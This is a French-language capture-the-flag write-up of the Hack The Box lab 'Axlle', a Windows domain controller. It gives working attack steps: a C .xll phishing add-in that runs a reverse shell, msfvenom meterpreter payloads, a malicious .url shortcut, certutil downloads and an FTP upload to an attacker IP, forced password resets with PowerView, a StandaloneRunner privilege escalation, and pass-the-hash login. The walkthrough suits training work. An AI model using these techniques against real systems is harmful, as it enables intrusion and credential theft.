---
date: 2024-11-15T17:00:51-06:00
# description: ""
image: "/images/HTB-Axlle/Axlle.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Axlle"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Axlle](https://app.hackthebox.com/machines/Axlle)
* Niveau: Difficile
* OS: Windows
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-axlle/)

Axlle est un contrôleur de domaine hébergeant un serveur web et un serveur de courrier électronique en plus des services Active Directory standard. Après notre reconnaissance, nous utilisons une attaque de phishing avec une pièce jointe `.xll` pour obtenir un accès initial au système. Sur la cible, nous découvrons un fichier `.eml` contenant des détails sur une tâche automatisée. En exploitant ces informations, nous créons un fichier `.url` malveillant, permettant un mouvement latéral vers un autre utilisateur et l'accès au drapeau utilisateur. Avec BloodHound, nous identifions la possibilité de forcer des changements de mot de passe sur des comptes spécifiques. Grâce à ce privilège, nous effectuons un autre déplacement latéral. Enfin, l'escalade des privilèges est réalisée par une injection de commandes via un binaire Windows.

Adresse IP cible - `10.10.11.21`

## Balayage

```
./nmap_scan.sh 10.10.11.21 Axlle
```

**Résultats**

```shell
Running detailed scan on open ports: 25,53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,61050,61051,61052,61056,61058,61071
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 17:09 CST
Nmap scan report for 10.10.11.21
Host is up (0.058s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Axlle Development
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-15 23:09:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
61050/tcp open  msrpc         Microsoft Windows RPC
61051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61052/tcp open  msrpc         Microsoft Windows RPC
61056/tcp open  msrpc         Microsoft Windows RPC
61058/tcp open  msrpc         Microsoft Windows RPC
61071/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-15T23:10:45
|_  start_date: N/A
|_clock-skew: 7s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.31 seconds
```

Notre cible est un contrôleur de domaine, en plus des services AD habituels, il dispose des éléments suivants:
* un serveur SMTP sur le port 25 avec hMailServer.
* Un serveur web sur le port 80 avec Microsoft IIS. 
* Le nom de domaine est `axlle.htb` que nous ajoutons au fichier `/etc/hosts`.

## Enumération

À l'adresse `http://axlle.htb/`, nous trouvons le site web d'une société de développement de logiciels. Il est en cours de maintenance, mais nous obtenons une adresse e-mail pour les contacts.

![Axlle website](/images/HTB-Axlle/axlle_website.png)

Outre les informations que nous avons obtenues précédemment, rien de particulier pour ce site web. Nous essayons de forcer les répertoires, mais nous ne trouvons rien d'intéressant.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://axlle.htb/ 
```

![directory brute forcing attempt](/images/HTB-Axlle/gobuster_axlle.png)

Notre tentative d'énumération des sous-domaines est tout aussi infructueuse.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://axlle.htb -H "Host: FUZZ.axlle.htb" -ic -fs 10228
```

![subdomain enumeration attempt](/images/HTB-Axlle/ffuf_axlle.png)

## Accès initial

Nous avons appris précédemment que les pièces jointes que nous envoyons à `accounts@axlle.htb` doivent être en format excel, mais nous ne pouvons pas utiliser les macros puisqu'elles sont désactivées. Une autre façon de créer des e-mails de phishing est d'utiliser des fichiers `xll`.

> Les fichiers `.xll` sont des fichiers Excel Add-In utilisés pour étendre les fonctionnalités de Microsoft Excel.

Sur [ce site](https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec) nous trouvons un exploit appelé `XLL - EXEC` que nous pouvons utiliser pour obtenir un reverse shell en envoyant un email avec une pièce jointe `.xll`. La première étape consiste à ajouter un reverse shell à l'exploit. 

```C
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void);

void __cdecl xlAutoOpen() {
    WinExec("PowerShell#3 from revshells.com", 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Nous compilons ensuite le programme C dans une bibliothèque partagée.

```
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll phishing.c -luser32
```

![xll compilation](/images/HTB-Axlle/xll_compilation.png)

Enfin, nous envoyons l'e-mail avec [swaks](https://github.com/jetmore/swaks).

![phishing email sent](/images/HTB-Axlle/phishing_email.png)

```
swaks --to accounts@axlle.htb --from kscorpio@axlle.htb --header "Subject: Open the doors" --body "Nothing to see here..." --attach @shell.xll
```

Après quelques minutes, nous obtenons un shell sous le nom de `gideon.hamill`.

![shell as gideon.hamill](/images/HTB-Axlle/foothold.png)

### Impasse (exploitation de la base de données)

Ce compte n'a rien d'intéressant dans les répertoires communs tels que `Desktop`, `Documents`, et `Downloads`; nous devons probablement chercher ailleurs. Par expérience, nous savons que `hMailServer` a généralement un mot de passe dans son fichier `INI`. Nous y accédons à `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI` et découvrons le mot de passe de l'administrateur et le mot de passe de la base de données.

![hMailServer passwords found](/images/HTB-Axlle/hmailserver_pwds.png)

Nous ne parvenons pas à déchiffrer le premier hachage, mais si nous réussissons à récupérer le mot de passe de la base de données, nous pourrons peut-être récupérer les mots de passe de certains utilisateurs. Nous utilisons [ce décrypteur](https://github.com/GitMirar/hMailDatabasePasswordDecrypter) pour trouver le mot de passe de la base de données, `4A02D41C55AC`

![database password](/images/HTB-Axlle/database_pwd.png)

Puisque le type de base de données est `MSSQLCE`, nous pouvons télécharger le fichier `.sdf` sur notre machine locale (j'ai utilisé la commande `download` dans un shell meterpreter). Le fichier `.sdf` se trouve dans `C:\Program Files (x86)\hMailServer\Database`.

![sdf file location](/images/HTB-Axlle/sdf_file_location.png)

> Un fichier `.sdf` (SQL Server Compact Database File) est un format de base de données utilisé par Microsoft SQL Server Compact Edition (SQL CE).

Allez sur [rebasedata](https://www.rebasedata.com) et convertissez votre fichier `.sdf` en format `sqlite`.

![sdf file conversion](/images/HTB-Axlle/sdf_file_conversion.png)

Une fois la conversion terminée, téléchargez le fichier `result.zip`. Extrayez-le et vous obtiendrez un fichier appelé `data.sqlite`. Exécutez les requêtes suivantes et vous trouverez un hash pour `accounts@axlle.htb`.

```
sqlite3 data.sqlite
.tables
SELECT * FROM hm_accounts;
```

![database password hash found](/images/HTB-Axlle/db_hashes.png)

Malheureusement, nous ne sommes pas en mesure de craquer ce hachage, il n'y a rien de plus à faire pour ce processus d'exploitation, alors cherchons une autre voie.

![hmailserver hash cracking failure](/images/HTB-Axlle/hmailserver_hashcrack_fail.png)

### Exploitation du fichier .URL (shell en tant que dallon.matrix)

Dans `C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F` nous trouvons un fichier `.eml`.

> Un fichier `.eml` est un message électronique enregistré au format standard MIME RFC 822. Ces fichiers sont généralement créés par des programmes de messagerie tels que Microsoft Outlook, Mozilla Thunderbird, etc. Le format de fichier `.eml` préserve l'en-tête, le corps et les pièces jointes du message original, ce qui le rend utile pour l'archivage et le transfert des messages électroniques.

![eml file location](/images/HTB-Axlle/eml_file.png)

Nous l'envoyons à notre machine locale par FTP (cela peut aussi être fait avec la commande `download` de meterpreter utilisée plus tôt).

```
pip3 install pyftpdlib
python3 -m pyftpdlib --port 21 --write
```

Sur la cible, nous exécutons la commande ci-dessous et recevons le fichier eml sur le serveur FTP:

```
(New-Object Net.WebClient).UploadFile('ftp://YOUR_IP/{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml', 'C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml')
```

![eml file download](/images/HTB-Axlle/eml_file_dl.png)

Nous apprenons que nous pouvons placer des liens dans le dossier `C:\inetpub\testing`, et que ces derniers seront automatiquement exécutés.

![content of eml file](/images/HTB-Axlle/webdev-team-email.png)

Nous pouvons transférer un fichier `.url` qui pointe vers un fichier malveillant dans le dossier `testing`.

> Les fichiers `.url` sont communément appelés raccourcis internet. Ils sont utilisés pour créer des raccourcis vers des sites web ou des ressources web, permettant aux utilisateurs d'y accéder rapidement sans avoir à naviguer dans un navigateur web.

1. Créer un fichier `.exe` avec msfvenom.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER -f exe -o payload.exe
```

![malicious exe file](/images/HTB-Axlle/malicious_exe.png)

2. Configurer le listener dans Metasploit.

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost YOUR_IP
set lport PORT_NUMBER
run
```

3. Créer le fichier `.url` avec le contenu suivant.

```
[InternetShortcut]
URL=file://YOUR_IP/share/payload.exe
```

4. Lancer un serveur SMB et un serveur web.

```
impacket-smbserver -smb2support share .

python3 -m http.server
```

![smb server](/images/HTB-Axlle/smb-server.png)

5. Placer le fichier .url dans le dossier de test.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/evil.url evil.url
```

![evil url file download](/images/HTB-Axlle/evil_url_download.png)

Après quelques secondes, nous obtenons un shell meterpreter en tant que `dallon.matrix`.

![dallon.matrix shell](/images/HTB-Axlle/dallon_shell.png)

Nous obtenons également le hachage du mot de passe de `dallon.matrix` sur le serveur SMB.

![dallon.matrix password hash](/images/HTB-Axlle/dallon_pwd_hash.png)

Mais nous ne parvenons pas à le craquer.

```
hashcat -a 0 -m 5600 dallon_hash.txt /usr/share/wordlists/rockyou.txt
```

![dallon.matrix password hash crack failure](/images/HTB-Axlle/dallon_hashcrack_fail.png)

Sur le bureau, nous trouvons le drapeau utilisateur.

![user flag](/images/HTB-Axlle/user_flag.png)

### Mouvement latéral (shell en tant que baz.humphries)

Pour l'énumération de l'Active Directory, nous utiliserons [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe).

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
```

Après l'avoir exécuté, téléchargez le fichier `zip`.

![sharphound zip file](/images/HTB-Axlle/sharphound_zip_file.png)

Décompressez-le et importez les fichiers dans Bloodhound.

Trouvez `dallon.matrix` et vous verrez qu'il est membre du groupe `Web Devs`.

![web devs group](/images/HTB-Axlle/web_devs_group.png)

Les membres du groupe `Web Devs` peuvent changer le mot de passe de `Baz.Humphries` et `Jacob.Greeny` à cause de `ForceChangePassword` dont nous pouvons abuser avec [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

> Cet attribut de compte permet d'appliquer un changement de mot de passe même sans connaître le mot de passe actuel de l'utilisateur. *Pour en savoir plus, cliquez [ici](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword).*

![ForceChangePassword](/images/HTB-Axlle/ForeceChangePassword.png)

Nous importons PowerView sur la cible.

```
certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1

Import-Module ./powerview.ps1
```

Nous changeons le mot de passe de `baz.humphries`.

```
$pass = ConvertTo-SecureString 'PleaseLetMeIn007!' -AsPlainText -Force

Set-DomainUserPassword -Identity Baz.Humphries -AccountPassword $pass
```

![Baz Humphries password change](/images/HTB-Axlle/password_change.png)

Nous nous connectons avec evil-winrm en tant que `baz.humphries`.

```
evil-winrm -u "baz.humphries" -p PleaseLetMeIn007! -i axlle.htb
```

![Baz Humphries login](/images/HTB-Axlle/baz_humphries_login.png)

## Elévation de Privilèges

Dans `C:\App Development\kbfiltr` nous trouvons un fichier `README.md`. L'une des lignes se lit comme suit "**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**".

![README location](/images/HTB-Axlle/README-location.png)

[Cette page Github](https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md) montre comment exploiter `StandaloneRunner.exe`.

1. Créer un fichier `reboot.rsf`, avec le contenu suivant. Ce fichier doit se trouver dans le même répertoire que `standalonerunner.exe` et `standalonexml.dll`.

```
myTestDir
True
```

2. Créer un répertoire avec la structure suivante `myTestDir\working`.

3. Créer un fichier `rsf.rsf` vide dans `myTestDir\working`.

4. Créez `command.txt` avec le reverse shell dans le même répertoire que `standalonerunner.exe`. (pour le reverse shell, j'ai utilisé PowerShell #3 (Base64) sur [revshells.com](https://www.revshells.com/))

Nous pouvons utiliser le script powershell ci-dessous pour automatiser toutes ces étapes.

```powershell
certutil.exe -urlcache -split -f "http://YOUR_IP:WEBSERVER_PORT/reboot.rsf" "reboot.rsf"

New-Item -Path "myTestDir\working" -ItemType "Directory" -Force

New-Item -Path "myTestDir\working" -Name "rsf.rsf" -ItemType "File"

certutil.exe -urlcache -split -f "http://YOUR_IP:WEBSERVER_PORT/command.txt" "command.txt"
```

![exploit script](/images/HTB-Axlle/exploit_script.png)

Après quelques secondes, nous obtenons un shell en tant qu'administrateur et nous pouvons lire le drapeau root.

![root flag](/images/HTB-Axlle/root_flag.png)

## Persistance

Notre accès au compte administrateur est un processus long et fastidieux. Afin d'établir la persistance, nous pouvons passer à un shell meterpreter et extraire les hashs avec `hashdump`. Nous récupérons alors les hachages des mots de passe de nombreux comptes sur la cible.

![hashdump command](/images/HTB-Axlle/hashdump.png)

Nous n'avons même pas besoin de les craquer, puisque nous pouvons les utiliser avec evil-winrm pour nous connecter.

```
evil-winrm -u "Administrator" -H 6322b5b9f9daecb0fefd594fa6fafb6a -i dc.axlle.htb
```

![administrator login via evil-winrm](/images/HTB-Axlle/Admin-login.png)

Merci d'avoir lu cet article!
